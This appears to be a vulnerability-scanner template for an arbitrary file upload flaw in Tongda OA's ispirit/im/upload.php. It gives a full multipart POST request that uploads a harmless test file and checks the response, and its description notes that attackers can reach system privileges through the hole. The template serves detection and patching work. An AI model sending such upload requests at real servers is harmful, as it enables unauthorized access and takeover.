app: 通达oa
query: app:"通达oa"
meta:
  name: 通达OA ispirit存在后台任意文件上传漏洞
  level: 4
  tags:
  - file_upload
  description: 通达OA是由北京通达信科科技有限公司自主研发的协同办公自动化系统，包括流程审批、行政办公、日常事务、数据统计分析、即时通讯、移动办公等，ispirit/im/upload.php文件存在任意文件上传，用户可以通过上传任意文件到服务器中，并且可以借助上传的文件利用shell工具直接获得system权限。
  homepage: ""
  author: X prism
  references: ""
  solution: 升级至最新版
  create_at: "2024-07-13 15:33:59"
  available: false
  steps:
    variable: []
    verify_steps:
      type: and
      verify:
      - request:
          method: POST
          path: /ispirit/im/upload.php
          redirect: true
          header:
          - Content-Type: multipart/form-data; boundary=----WebKitFormBoundarypyfBh1YB4pV8McGB
          params: |-
            ------WebKitFormBoundarypyfBh1YB4pV8McGB
            Content-Disposition: form-data; name="UPLOAD_MODE"

            2
            ------WebKitFormBoundarypyfBh1YB4pV8McGB
            Content-Disposition: form-data; name="P"

            123
            ------WebKitFormBoundarypyfBh1YB4pV8McGB
            Content-Disposition: form-data; name="DEST_UID"

            1
            ------WebKitFormBoundarypyfBh1YB4pV8McGB
            Content-Disposition: form-data; name="ATTACHMENT"; filename="jpg"
            Content-Type: image/jpeg

            test
            ------WebKitFormBoundarypyfBh1YB4pV8McGB--
        response:
        - name: body
          value: '"content"'
          type: contains
        - name: code
          value: "200"
          type: equals
    exploit_steps:
      type: ""
      params:
        name: ""
        type: input
        value: ""
